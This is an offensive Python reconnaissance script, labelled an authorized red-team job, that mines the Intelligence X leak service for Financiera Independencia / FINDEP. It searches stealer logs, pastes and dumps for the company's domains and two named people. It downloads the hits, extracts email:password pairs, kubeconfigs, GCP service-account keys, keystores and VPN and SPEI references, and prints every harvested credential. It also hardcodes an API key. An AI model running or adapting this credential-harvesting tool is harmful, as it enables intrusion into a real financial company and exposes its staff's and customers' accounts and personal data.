#!/usr/bin/env python3
"""FINDEP / Financiera Independencia — IntelX deep hunt (authorized red team).

Covers ALL requested terms: phonebook + intelligent, then file/read of
interesting hits (stealers, kubeconfig, GCP SA, SPEI/JKS/PEM, VPN, yml).
Output: independencia_attack/intelx_findep_results.json
"""
from __future__ import annotations

import json
import re
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

BASE = "https://2.intelx.io"
KEY = "6f65b43b-19df-4e12-aea3-115d793e9763"
HEADERS = {"x-key": KEY, "Content-Type": "application/json", "User-Agent": "IX-Python/1.0"}
H_GET = {"x-key": KEY, "User-Agent": "IX-Python/1.0"}
OUT = Path(r"c:\xampp\htdocs\pentagi\independencia_attack\intelx_findep_results.json")

STEALER_BUCKETS = ["leaks.logs", "leaks.restricted", "leaks.public", "pastes", "dumpster"]

PHONEBOOK = [
    {"id": "pb_emails", "term": "independencia.com.mx", "target": 2, "label": "emails"},
    {"id": "pb_domains", "term": "independencia.com.mx", "target": 1, "label": "domains"},
]

INTEL_SEARCHES = [
    {"id": "intel_independencia", "term": "independencia.com.mx", "buckets": STEALER_BUCKETS},
    {"id": "intel_calidad", "term": "calidad-architect.com", "buckets": STEALER_BUCKETS},
    {"id": "intel_findep", "term": "findep.mx", "buckets": STEALER_BUCKETS},
    {"id": "intel_at_independencia", "term": "@independencia.com.mx", "buckets": STEALER_BUCKETS},
    {"id": "intel_kubeconfig", "term": "kubeconfig independencia", "buckets": []},
    {"id": "intel_fisa", "term": "fisa.independencia", "buckets": []},
    {"id": "intel_spei", "term": "spei independencia.com.mx", "buckets": []},
    {"id": "intel_jks", "term": "jks independencia", "buckets": []},
    {"id": "intel_pem", "term": "pem independencia", "buckets": []},
    {"id": "intel_soto", "term": "Luis Rodrigo Soto Solorzano", "buckets": STEALER_BUCKETS},
    {"id": "intel_escamilla", "term": "Roman Escamilla independencia", "buckets": STEALER_BUCKETS},
]

INTERESTING_NAME_KW = [
    "password", "passwords", "allpass", "credentials", "login", "mailpass",
    "urlpw", "autofill", "pass.txt", "passwords.txt", "user.txt",
    "kubeconfig", "kube/config", ".kube", "service-account", "sa.json",
    "application.yml", "application.yaml", "application.properties",
    ".jks", ".pem", ".pfx", ".p12", ".key", "keystore", "truststore",
    "anyconnect", "fortivpn", "globalprotect", "vpn", "cisco",
    "gcp", "gcloud", "gke", "token", "secret", "spei", "stp", "pocc",
    "independencia", "findep", "calidad-architect", "fisa",
]
SKIP_NAME_KW = ["cookie", "history", "autofill_form", "screenshot"]
TARGET_KW = [
    "independencia", "findep", "calidad-architect", "fisa.independencia",
    "soto", "escamilla", "kubeconfig", "gke", "gcp", "spei", "jks",
]
EMAIL_RE = re.compile(r"(?i)([a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,})")
EMAIL_PASS_RE = re.compile(r"(?i)([a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,})\s*[:|;]\s*(\S+)")
URL_USER_PASS_RE = re.compile(r"(?i)(https?://[^\s:]+):([^:\s]+):(.+)")
SOFT_USER_PASS_RE = re.compile(r"(?i)(?:user(?:name)?|email|login)\s*[:=]\s*(\S+).{0,80}(?:password|pass|pwd)\s*[:=]\s*(\S+)")


def log(msg: str) -> None:
    print(msg, flush=True)


def credits():
    try:
        r = requests.get(f"{BASE}/authenticate/info", headers=H_GET, timeout=30, verify=False)
        try:
            return r.status_code, r.json()
        except Exception:
            return r.status_code, {"raw": r.text[:500]}
    except Exception as e:
        return None, {"error": str(e)}


def credit_paths(info: dict) -> dict:
    if not isinstance(info, dict):
        return {}
    paths = info.get("paths") or info.get("Credits") or info
    out = {}
    if isinstance(paths, dict):
        for k, v in paths.items():
            if isinstance(v, dict) and ("Credit" in v or "Used" in v or "credit" in v):
                out[k] = v
    return out


def save(obj: dict) -> None:
    OUT.write_text(json.dumps(obj, indent=2, ensure_ascii=False, default=str), encoding="utf-8")


def phonebook_start(term: str, target: int, maxresults: int = 1000):
    body = {"term": term, "maxresults": maxresults, "media": 0, "target": target, "timeout": 10, "terminate": []}
    r = requests.post(f"{BASE}/phonebook/search", headers=HEADERS, json=body, timeout=60, verify=False)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, {"raw": r.text[:800]}


def phonebook_poll(search_id: str, limit: int = 1000, max_wait: int = 50):
    deadline = time.time() + max_wait
    last = None
    selectors = []
    while time.time() < deadline:
        r = requests.get(
            f"{BASE}/phonebook/search/result",
            headers=H_GET,
            params={"id": search_id, "limit": limit, "offset": 0},
            timeout=60,
            verify=False,
        )
        try:
            data = r.json()
        except Exception:
            time.sleep(2)
            continue
        last = data
        selectors = data.get("selectors") or []
        status = data.get("status")
        if status in (1, 2, 3):
            break
        time.sleep(2)
    return selectors, last


def intel_start(term: str, buckets: list | None, maxresults: int = 100):
    body = {
        "term": term,
        "buckets": buckets or [],
        "lookuplevel": 0,
        "maxresults": maxresults,
        "timeout": 10,
        "datefrom": "",
        "dateto": "",
        "sort": 2,
        "media": 0,
        "terminate": [],
    }
    r = requests.post(f"{BASE}/intelligent/search", headers=HEADERS, json=body, timeout=60, verify=False)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, {"raw": r.text[:1000]}


def intel_poll(search_id: str, limit: int = 100, max_wait: int = 55):
    records = []
    last_status = None
    deadline = time.time() + max_wait
    while time.time() < deadline:
        r = requests.get(
            f"{BASE}/intelligent/search/result",
            headers=H_GET,
            params={"id": search_id, "limit": limit, "offset": 0},
            timeout=60,
            verify=False,
        )
        try:
            data = r.json()
        except Exception:
            time.sleep(2)
            continue
        last_status = data.get("status")
        recs = data.get("records") or []
        if recs:
            records = recs
        if last_status in (1, 2, 3):
            break
        time.sleep(2 if not recs else 1)
    return last_status, records


def slim(rec: dict) -> dict:
    keep = [
        "systemid", "storageid", "name", "bucket", "date", "media", "mediah",
        "size", "type", "instore", "accesslevel", "xscore", "keyvalues",
    ]
    return {k: rec.get(k) for k in keep if k in rec}


def is_interesting(rec: dict) -> bool:
    name = str(rec.get("name") or rec.get("mediah") or "").lower()
    bucket = str(rec.get("bucket") or "").lower()
    if any(k in name for k in SKIP_NAME_KW) and "password" not in name and "pass" not in name:
        return False
    if any(k in name for k in INTERESTING_NAME_KW):
        return True
    if bucket in ("leaks.logs", "dumpster", "pastes", "leaks.restricted") and (rec.get("size") or 0) < 800_000:
        return True
    return False


def download_content(rec: dict) -> tuple[str, str]:
    sid = rec.get("storageid") or rec.get("systemid") or ""
    bucket = rec.get("bucket") or ""
    if not sid:
        return "", "no-id"
    size = rec.get("size") or 0
    timeout = 90 if size > 1_000_000 else 45
    attempts = [
        (f"{BASE}/file/read", {"type": 0, "storageid": sid, "bucket": bucket}),
        (f"{BASE}/file/view", {"f": 0, "storageid": sid, "bucket": bucket}),
        (f"{BASE}/file/preview", {"f": 0, "l": 800, "storageid": sid, "bucket": bucket}),
    ]
    last_err = "empty"
    for url, params in attempts:
        try:
            r = requests.get(url, headers=H_GET, params=params, timeout=timeout, verify=False)
            if r.status_code == 200 and r.text and not r.text.startswith("{") or (
                r.status_code == 200 and r.text and "independencia" in r.text.lower()
            ):
                if r.text.strip():
                    return r.text, url.split("/")[-1]
            if r.status_code == 200 and r.text:
                return r.text, url.split("/")[-1]
            last_err = f"{url.split('/')[-1]}:{r.status_code}"
        except Exception as e:
            last_err = str(e)[:120]
    return "", last_err


def extract_from_text(content: str, source: str, term: str) -> list[dict]:
    found = []
    lines = content.splitlines()
    for i, line in enumerate(lines):
        ll = line.lower()
        if not any(k in ll for k in TARGET_KW) and "@independencia.com.mx" not in ll and "@findep" not in ll:
            if "kube" not in ll and "gke" not in ll and ".jks" not in ll and "service_account" not in ll:
                continue
        block = []
        for j in range(max(0, i - 2), min(len(lines), i + 5)):
            t = lines[j].strip()
            if t:
                block.append(t[:300])
        entry = {
            "term": term,
            "source": source,
            "line_num": i + 1,
            "match_line": line.strip()[:400],
            "context": block,
        }
        m = URL_USER_PASS_RE.match(line.strip())
        if m:
            entry["url"] = m.group(1)
            entry["username"] = m.group(2)
            entry["password"] = m.group(3)
        else:
            m2 = EMAIL_PASS_RE.search(line)
            if m2:
                entry["email"] = m2.group(1)
                entry["password"] = m2.group(2)
            else:
                m3 = SOFT_USER_PASS_RE.search(" ".join(block))
                if m3:
                    entry["username"] = m3.group(1)
                    entry["password"] = m3.group(2)
        emails = EMAIL_RE.findall(line)
        if emails and "emails" not in entry:
            entry["emails_on_line"] = emails
        found.append(entry)
    return found


def looks_like_k8s_or_gcp(content: str) -> dict:
    low = content.lower()
    flags = {
        "kubeconfig": "apiVersion:" in content and ("clusters:" in low or "kind: config" in low or "client-key-data" in low),
        "gcp_sa_json": '"type"' in low and "service_account" in low and "private_key" in low,
        "gke_token": "ya29." in content or "gke_" in low or "kubernetes.io" in low,
        "jks_or_keystore": any(x in low for x in [".jks", "keystore", "truststore", "keypass", "storepass"]),
        "pem_or_cert": "-----begin" in low,
        "vpn": any(x in low for x in ["anyconnect", "forticlient", "globalprotect", "vpn.independencia", "cisco"]),
        "spring_yml": "spring:" in low and ("password:" in low or "datasource" in low),
        "spei_stp": any(x in low for x in ["spei", "stp", "pocc", "banxico"]),
    }
    return {k: v for k, v in flags.items() if v}


def main():
    started = datetime.now(timezone.utc).isoformat()
    sc0, creds_before = credits()
    log(f"[credits before] http={sc0}")
    log(json.dumps(credit_paths(creds_before) or creds_before, default=str)[:1200])

    out = {
        "target": "Financiera Independencia / FINDEP",
        "mission": "IntelX deep search — K8s/GCP/SPEI/VPN/employee creds (authorized engagement)",
        "started_utc": started,
        "credits_before": creds_before,
        "credits_usage": [],
        "phonebook": {},
        "intelligent": [],
        "downloaded_files": [],
        "credentials": [],
        "k8s_gcp_hits": [],
        "cert_keystore_refs": [],
        "vpn_refs": [],
        "unique_email_password": [],
        "unique_emails": [],
        "summary": {},
    }
    save(out)

    # ---- Phonebook ----
    all_emails = set()
    all_domains = set()
    for spec in PHONEBOOK:
        log(f"\n=== PHONEBOOK {spec['id']}: {spec['term']} target={spec['target']} ({spec['label']}) ===")
        sc_b, before_snap = credits()
        try:
            http, start = phonebook_start(spec["term"], spec["target"])
        except Exception as e:
            out["phonebook"][spec["id"]] = {"error": str(e)}
            log(f"  START FAIL: {e}")
            save(out)
            continue
        sid = (start or {}).get("id")
        log(f"  start http={http} id={sid}")
        if http != 200 or not sid:
            out["phonebook"][spec["id"]] = {"start_http": http, "start": start, "error": "no id"}
            save(out)
            continue
        selectors, raw = phonebook_poll(sid)
        values = []
        for s in selectors:
            val = s.get("selectorvalue")
            if val:
                values.append(val)
                if spec["label"] == "emails":
                    all_emails.add(val.lower())
                else:
                    all_domains.add(val.lower())
        sc_a, after_snap = credits()
        usage = {
            "call": f"/phonebook/search {spec['id']}",
            "http_before": sc_b,
            "http_after": sc_a,
            "paths_before": credit_paths(before_snap),
            "paths_after": credit_paths(after_snap),
        }
        out["credits_usage"].append(usage)
        out["phonebook"][spec["id"]] = {
            "term": spec["term"],
            "target": spec["target"],
            "label": spec["label"],
            "start_http": http,
            "count": len(values),
            "selectors": values,
            "raw_status": (raw or {}).get("status"),
        }
        log(f"  -> {len(values)} selectors")
        for v in values[:80]:
            log(f"     {v}")
        if len(values) > 80:
            log(f"     ... {len(values) - 80} more")
        save(out)
        time.sleep(1.2)

    # ---- Intelligent ----
    all_records: dict[str, dict] = {}
    for spec in INTEL_SEARCHES:
        log(f"\n=== INTEL {spec['id']}: {spec['term']!r} buckets={spec['buckets'] or 'ALL'} ===")
        sc_b, before_snap = credits()
        entry = {"id": spec["id"], "term": spec["term"], "buckets": spec["buckets"]}
        try:
            http, start = intel_start(spec["term"], spec["buckets"])
        except Exception as e:
            entry["error"] = str(e)
            out["intelligent"].append(entry)
            log(f"  START FAIL: {e}")
            save(out)
            continue
        sid = (start or {}).get("id")
        entry["start_http"] = http
        log(f"  start http={http} id={sid} msg={str(start)[:180]}")
        if http != 200 or not sid:
            # retry without buckets if bucket list rejected
            if spec["buckets"]:
                log("  retry without buckets")
                http, start = intel_start(spec["term"], [])
                sid = (start or {}).get("id")
                entry["start_http_retry"] = http
                entry["retried_no_buckets"] = True
                log(f"  retry http={http} id={sid}")
            if not sid:
                entry["error"] = "no search id"
                entry["start_response"] = start
                out["intelligent"].append(entry)
                save(out)
                continue
        status, records = intel_poll(sid)
        entry["poll_status"] = status
        entry["record_count"] = len(records)
        slimmed = [slim(r) for r in records]
        entry["records"] = slimmed
        log(f"  records={len(records)} status={status}")
        for r in slimmed[:40]:
            log(f"     [{r.get('bucket')}] {str(r.get('name'))[:110]} size={r.get('size')}")
        if len(slimmed) > 40:
            log(f"     ... {len(slimmed) - 40} more")
        for r in records:
            key = r.get("storageid") or r.get("systemid") or ""
            if key and key not in all_records:
                all_records[key] = {"record": r, "terms": [spec["term"]]}
            elif key:
                all_records[key]["terms"].append(spec["term"])
        sc_a, after_snap = credits()
        out["credits_usage"].append({
            "call": f"/intelligent/search {spec['id']}",
            "http_before": sc_b,
            "http_after": sc_a,
            "paths_before": credit_paths(before_snap),
            "paths_after": credit_paths(after_snap),
        })
        out["intelligent"].append(entry)
        save(out)
        time.sleep(1.2)

    # ---- Download interesting files ----
    log("\n=== FILE READ interesting hits ===")
    interesting = []
    for info in all_records.values():
        rec = info["record"]
        if is_interesting(rec):
            interesting.append(info)
    interesting.sort(key=lambda x: (0 if is_interesting(x["record"]) else 1, -(x["record"].get("xscore") or 0)))
    log(f"  candidates={len(interesting)} unique_records={len(all_records)}")

    downloaded = 0
    max_dl = 25
    for info in interesting:
        if downloaded >= max_dl:
            break
        rec = info["record"]
        name = rec.get("name") or ""
        bucket = rec.get("bucket") or ""
        sid = rec.get("storageid") or rec.get("systemid") or ""
        log(f"\n  DL [{bucket}] {name[:100]} sid={sid[:24]}...")
        content, via = download_content(rec)
        if not content:
            log(f"    FAIL {via}")
            out["downloaded_files"].append({
                "name": name, "bucket": bucket, "storageid": sid,
                "terms": info["terms"], "error": via,
            })
            save(out)
            continue
        downloaded += 1
        log(f"    OK via={via} chars={len(content)}")
        flags = looks_like_k8s_or_gcp(content)
        snippet = content[:2500]
        item = {
            "name": name,
            "bucket": bucket,
            "storageid": sid,
            "terms": info["terms"],
            "via": via,
            "chars": len(content),
            "flags": flags,
            "snippet": snippet,
        }
        out["downloaded_files"].append(item)
        if flags.get("kubeconfig") or flags.get("gcp_sa_json") or flags.get("gke_token"):
            out["k8s_gcp_hits"].append({**item, "snippet": content[:8000]})
            log(f"    *** K8s/GCP FLAGS {list(flags)}")
        if flags.get("jks_or_keystore") or flags.get("pem_or_cert") or flags.get("spei_stp"):
            out["cert_keystore_refs"].append({"name": name, "bucket": bucket, "flags": flags, "terms": info["terms"], "match": snippet[:600]})
        if flags.get("vpn"):
            out["vpn_refs"].append({"name": name, "bucket": bucket, "terms": info["terms"], "match": snippet[:600]})
        creds = extract_from_text(content, name, info["terms"][0])
        if creds:
            log(f"    creds/blocks={len(creds)}")
            for c in creds[:8]:
                log(f"      {c.get('match_line', '')[:160]}")
            out["credentials"].extend(creds)
        save(out)
        time.sleep(0.6)

    # Filename-only cert/k8s refs
    for info in all_records.values():
        rec = info["record"]
        name = str(rec.get("name") or "")
        low = name.lower()
        if any(x in low for x in [".jks", ".pem", ".pfx", ".p12", ".key", "keystore", "kubeconfig", "sa.json", "service-account"]):
            out["cert_keystore_refs"].append({
                "name": name,
                "bucket": rec.get("bucket"),
                "storageid": rec.get("storageid"),
                "terms": info["terms"],
                "filename_match": True,
            })

    # Unique email:password
    pairs = []
    seen_p = set()
    for c in out["credentials"]:
        email = (c.get("email") or "").strip()
        user = (c.get("username") or "").strip()
        pw = (c.get("password") or "").strip()
        ident = email or user
        if ident and pw:
            key = (ident.lower(), pw)
            if key not in seen_p:
                seen_p.add(key)
                pairs.append({"identity": ident, "password": pw, "url": c.get("url"), "source": c.get("source"), "term": c.get("term")})
        for e in c.get("emails_on_line") or []:
            all_emails.add(e.lower())
        if email:
            all_emails.add(email.lower())

    out["unique_email_password"] = pairs
    out["unique_emails"] = sorted(all_emails)
    out["unique_domains"] = sorted(all_domains)

    sc1, creds_after = credits()
    log(f"\n[credits after] http={sc1}")
    log(json.dumps(credit_paths(creds_after) or creds_after, default=str)[:1200])
    out["credits_after"] = creds_after
    out["finished_utc"] = datetime.now(timezone.utc).isoformat()
    out["summary"] = {
        "phonebook_emails": len(out["phonebook"].get("pb_emails", {}).get("selectors") or []),
        "phonebook_domains": len(out["phonebook"].get("pb_domains", {}).get("selectors") or []),
        "intelligent_searches": len(out["intelligent"]),
        "intelligent_records_total": sum(e.get("record_count") or 0 for e in out["intelligent"]),
        "unique_records": len(all_records),
        "files_downloaded": downloaded,
        "credential_blocks": len(out["credentials"]),
        "unique_email_password": len(pairs),
        "unique_emails": len(all_emails),
        "k8s_gcp_hits": len(out["k8s_gcp_hits"]),
        "cert_keystore_refs": len(out["cert_keystore_refs"]),
        "vpn_refs": len(out["vpn_refs"]),
    }
    save(out)
    log("\n========== SUMMARY ==========")
    log(json.dumps(out["summary"], indent=2))
    log(f"SAVED {OUT}")
    if pairs:
        log("\nEMAIL:PASSWORD PAIRS:")
        for p in pairs:
            log(f"  {p['identity']}:{p['password']}  src={p.get('source')}")
    else:
        log("\nNo email:password pairs extracted.")


if __name__ == "__main__":
    main()
